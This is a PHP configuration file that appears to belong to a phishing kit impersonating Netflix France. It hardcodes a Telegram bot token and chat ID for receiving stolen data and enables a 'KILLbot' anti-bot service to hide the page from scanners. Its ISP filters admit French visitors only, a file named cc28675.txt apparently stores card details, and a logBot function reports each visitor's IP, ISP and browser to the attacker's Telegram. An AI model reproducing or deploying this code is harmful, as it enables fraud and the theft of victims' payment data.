<?php
$botToken = '5696868644:AAEsc-scUJDXraipX3C3uMSgyCpVntw5WLY';
$chatID = '5341268495';
$mail = '';
$antibotToken = 'IWdpekz3b-QFDhBe5MjDfyADffzYrVAdkFLfKXzw_5pPv';
$antibotRedirect = "https://www.netflix.com/fr";
$whitelist_ip = 'XX.XX.XX.XX';
$send_mail = false;
$send_telegram = true;
$log_bot = false;
$test_ip = '';

//Anti-bot KILLbot
$killbot_active = true;

//Filtre ISP
$disable_isp = false;

//Filtre ISP 2ème couche
$isp_italy_check = false;
$isp_austria_check = false;
$isp_swiss_check = false;
$isp_netherlands_check = false;
$isp_deutschland_check = false;
$isp_danish_check = false;
$isp_sweden_check = false;
$isp_canada_check = false;
$isp_france_check = true;
$isp_portugal_check = false;
$isp_spain_check = false;
$isp_ireland_check = false;
$isp_UK_check = false;
$isp_luxembourg_check = false;
$isp_belgium_check = false;
$isp_uea_check = false;
$isp_usa_check = false;

$filename_cc = './cc28675.txt';
$filename_log = './log55265.txt';

function logBot($accepted, $ip, $botToken, $chatID, $log_bot, $isKillbot, $agent){
    $who = $isKillbot ? 'KILLBot': 'ISP check';
    if ($log_bot){
        if ($accepted){
            $string = "Acceptée";
        } else {
            $string = "Bloquée";
        }
        $ipInfo = file_get_contents("http://ip-api.com/json/" . $ip);
        $ipInfo_json = json_decode($ipInfo, true);
        if ($ipInfo_json['status'] != 'fail'){
            $org = "{$ipInfo_json['as']}";
        } else {
            $org = "Introuvable";
        }
        $urls = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=";
        $data = "Opérateur : ".$org."\n IP: ".$ip."\n Connexion : ".$string."\n".$who."\n".$agent."\nBy Nanadaime75";
        file_get_contents($urls.urlencode($data));
    }
}

?>